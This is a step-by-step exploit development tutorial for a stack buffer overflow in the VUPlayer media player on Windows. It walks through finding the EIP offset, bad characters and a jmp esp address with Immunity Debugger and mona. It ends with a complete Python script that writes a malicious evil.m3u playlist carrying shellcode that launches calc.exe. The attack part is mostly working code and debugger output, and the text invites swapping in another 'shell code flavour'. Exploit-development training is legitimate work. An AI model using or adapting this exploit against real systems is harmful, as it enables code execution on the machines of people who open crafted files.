# VUPlayer Buffer OverFlow
---
## Step by step guide
### Sofware:

- Immunity debugger
- mona
- VUPlayer
- Notepad ++
- VMVirtualbox
### OS:
- Kali linux
- Windows 10 pro

---
Write the base python script for the exploitation proccess and name it as vup_exploit.py
```python
#!/usr/bin/python
import subprocess
import os

print ("-") *40
print ("| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|              thankss to Master Dreg! |")
print ("-") *40

shellcode_bind_shellfer = '\x41' * 1500 # AAAA Padding
#shellcode_bind_shellfer += '\x42\x42\x42\x42' # BBBB ret address
#shellcode_bind_shellfer += ''

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```
---
This Script line will generate a \x41 pattern adding the \x41 desired ammount. You can try with a diferent lenght.
```python
shellcode_bind_shellfer = '\x41' * 1500 # padding
```
A 1500 \x41 pattern will be created after run the script in windows terminal
```sh
----------------------------------------
| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |
----------------------------------------
|              thankss to Master Dreg! |
----------------------------------------

file content (size 1500 bytes):

41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41
```

Open immunity debugger and run VUPlayer.exe with F9
Open VUPlayer and add evil.m3u to a playlist

the pattern of \ x41 exceeds the buffer limit.
Create a folder for logs in c: using this mona command in immunity
```python
!mona config -set workingfolder c:\logs\%p
```
check in Immunity log windows.
```sh
Log data, item 2
 Address=0BADF00D
 Message=New value of parameter workingfolder =  c:\logs\%p
```
Create a pattern of same length as your /x41 pattern in immunity, in this case 1500. Write the next command:
```python
!mona pattern_create 1500
```
Cpy pattern from logs
```sh
================================================================================
  Output generated by mona.py v2.0, rev 613 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : 10, release 10.0.19041
  Process being debugged : VUPlayer (pid 7688)
  Current mona arguments: pattern_create 1500
================================================================================
  2021-01-14 23:27:54
================================================================================

Pattern of 1500 bytes :
-----------------------

ASCII:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9
```
Copy ASCII pattern from ...\logs\VUPlayer folder ("pattern.txt) to an empty .txt file and rename as evil.m3u
on immunity press control+F2 and F9, and open evil.m3u file in VUPlayer

Now check the offset with this !mona command:
```python
!mona pattern_offset EIP
```
```sh
Log data, item 8
 Address=0BADF00D
 Message= - Pattern h7Bh (0x68423768) found in cyclic pattern at position 1012
```
Now we are ready! and we know the exact amount of space (1012bytes) avaible on the stack, we will check now if everithing its fine by adding 4 "B" to overwrite the returning address.
```python

#!/usr/bin/python
import subprocess
import os

print ("-") *40
print ("| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|              thankss to Master Dreg! |")
print ("-") *40

shellcode_bind_shellfer = '\x41' * 1012 # AAAA Padding
shellcode_bind_shellfer += '\x42\x42\x42\x42' # BBBB ret address
#shellcode_bind_shellfer += ''

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()

```
Run the script and see if the EIP register is filled with "BBBB" \x42\x42\x42\x42

```sh
EAX 00000000
ECX 41414141
EDX 00000000
EBX 00000001
ESP 0019E714
EBP 41414141
ESI 00000000
EDI 0019EA80
EIP 42424242
C 0  ES 002B 32bit 0(FFFFFFFF)
P 1  CS 0023 32bit 0(FFFFFFFF)
A 0  SS 002B 32bit 0(FFFFFFFF)
Z 1  DS 002B 32bit 0(FFFFFFFF)
S 0  FS 0053 32bit 306000(FFF)
T 0  GS 002B 32bit 0(FFFFFFFF)
D 0
O 0  LastErr ERROR_PATH_NOT_FOUND (00000003)
EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST 4020  Cond 1 0 0 0  Err 0 0 1 0 0 0 0 0  (EQ)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

```
## Finding the BadChars

Create a byte array with mona, copy from bytearray.txt on logs folder and paste it to the script. And... run it!

```python
!mona bytearray -cpb "\x00"
```
```python
#!/usr/bin/python
import subprocess
import os

print ("-") *40
print ("| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|              thankss to Master Dreg! |")
print ("-") *40

shellcode_bind_shellfer = '\x41' * 1012 # AAAA Padding
shellcode_bind_shellfer += '\x42\x42\x42\x42' # BBBB ret address
#shellcode_bind_shellfer += ''
shellcode_bind_shellfer += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
shellcode_bind_shellfer += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
shellcode_bind_shellfer += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
shellcode_bind_shellfer += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
shellcode_bind_shellfer += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
shellcode_bind_shellfer += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
shellcode_bind_shellfer += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
shellcode_bind_shellfer += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
#print ("\nfile content (size " + str(len(shellcode_bind_shellfer)) + " bytes):\n")
#print (":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()

```
Run the script and launch VUPlayer again to compare results with mona, go to Expresion (Ctrl+G) ESP to find out what is happening.
```sh
0019E714  01 02 03 04 05 06 07 08 00 E8 19 00 BC 53 54 02  .è.¼ST
```
```python
!mona bytearray -cpb "\x00"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
mona Memory comparison results

|Address                  |Status                    |BadChars                  |Type                      |Location    |
| ----------------------- | ------------------------ | ------------------------ | ------------------------ | ---------- |
| 0x0019e714              |  Corruption after 0 bytes|   00 01                  |   normal                 |   Stack    |

remove the badchars from the pattern in the script and repeat the procces again...

```python
!mona bytearray -cpb "\x00\x01"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
|Address                  |Status                    |BadChars                  |Type                      |Location    |
| ----------------------- | ------------------------ | ------------------------ | ------------------------ | ---------- |
| 0x0019e714              |  Corruption after 0 bytes|   00 01 09               |   normal                 |   Stack    |

remove the badchars from the pattern in the script and repeat the procces again...

```python
!mona bytearray -cpb "\x00\x01\x09"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
mona Memory comparison results 

|Address                  |Status                    |BadChars                  |Type                      |Location    |
| ----------------------- | ------------------------ | ------------------------ | ------------------------ | ---------- |
| 0x0019e714              |  Corruption after 0 bytes|   00 01 09 0a            |   normal                 |   Stack    |

Remove \x0a and repeat the proccess again

```python
!mona bytearray -cpb "\x00\x01\x09\x0a"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
mona Memory comparison results 

|Address                  |Status                    |BadChars                  |Type                      |Location    |
| ----------------------- | ------------------------ | ------------------------ | ------------------------ | ---------- |
| 0x0019e714              |  Corruption after 0 bytes|   00 01 09 0a 1a         |   normal                 |   Stack    |

Remove \x1a and repeat the proccess again

```python
!mona bytearray -cpb "\x00\x01\x09\x0a\x1a"
!mona compare -f C:\logs\VUPlayer\bytearray.bin -a 0019e714
```
```sh
Log data, item 4
 Address=0019E714
 Message=[+] Comparing with memory at location : 0x0019e714 (Stack)
Log data, item 3
 Address=0019E714
 Message=!!! Hooray, normal shellcode unmodified !!!
 Log data, item 2
 Address=0019E714
 Message=Bytes omitted from input: 00 01 09 0a 1a
```
Hurray! We have find all badchars, now it is time to search the return address to refine our code and launch the final script with our shell code.

---
## The return address
To ensure the exit of the sploitation proccess we need to find a jmp esp without ASLR and without 00, execute the next python command.

```python
!mona jmp -r esp
```
Check and choose your desired address with ASLR: False
```sh
0BADF00D   [+] Results :
0043373B     0x0043373b : jmp esp | startnull,asciiprint,ascii {PAGE_EXECUTE_READ} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files (x86)\VUPlayer\VUPlayer.exe)
004B8E91     0x004b8e91 : jmp esp | startnull {PAGE_EXECUTE_READ} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files (x86)\VUPlayer\VUPlayer.exe)
1010539F     0x1010539f : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASSWMA.dll)
1000D0FF     0x1000d0ff : jmp esp | null {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
100222C5     0x100222c5 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
10022AA7     0x10022aa7 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
1002A659     0x1002a659 : jmp esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
00459E91     0x00459e91 : call esp | startnull {PAGE_EXECUTE_READ} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files (x86)\VUPlayer\VUPlayer.exe)
100218DF     0x100218df : call esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
10022307     0x10022307 : call esp | ascii {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
100226FF     0x100226ff : call esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
10022ACF     0x10022acf : call esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
10022F07     0x10022f07 : call esp | ascii {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
1003B43B     0x1003b43b : call esp |  {PAGE_EXECUTE_READWRITE} [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.3 (C:\Program Files (x86)\VUPlayer\BASS.dll)
004CD6DE     0x004cd6de : push esp # ret  | startnull {PAGE_EXECUTE_READ} [VUPlayer.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v2.49 (C:\Program Files (x86)\VUPlayer\VUPlayer.exe)
0BADF00D       Found a total of 15 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:05.648000
```
Copy the ret address 0x100222c5 and paste on the script (remeber little endian) with your favorite "shell code flavour" and...
```python
#!/usr/bin/python
import subprocess
import os

print ("-") *40
print ("| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |")
print ("-") *40
print ("|              thankss to Master Dreg! |")
print ("-") *40

shellcode_bind_shellfer = '\x41' * 1012 # AAAA Padding
#shellcode_bind_shellfer += '\x42\x42\x42\x42' # BBBB ret address 
shellcode_bind_shellfer += '\xc5\x22\x02\x10' # 0x100222c5 ret address 
shellcode_bind_shellfer += '\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0'

#badchars = \x00\x01\x09\x0a\x1a
#shellcode_bind_shellfer += "\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f\x20"
#shellcode_bind_shellfer += "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
#shellcode_bind_shellfer += "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
#shellcode_bind_shellfer += "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
#shellcode_bind_shellfer += "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
#shellcode_bind_shellfer += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
#shellcode_bind_shellfer += "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
#shellcode_bind_shellfer += "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

print("\nfile content (size " + str(len(shellcode_bind_shellfer))  + " bytes):\n")
print(":".join("{:02x}".format(ord(c)) for c in shellcode_bind_shellfer))

f = open('evil.m3u', 'wb')

f.write(shellcode_bind_shellfer)

f.close()
```
The final script will launch a shell that opens a windows calc program

```sh
----------------------------------------
| VUPlayer Exploit v1.0 by Sm@rtR3v0lt |
----------------------------------------
|              thankss to Master Dreg! |
----------------------------------------

file content (size 1211 bytes):

41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41:41: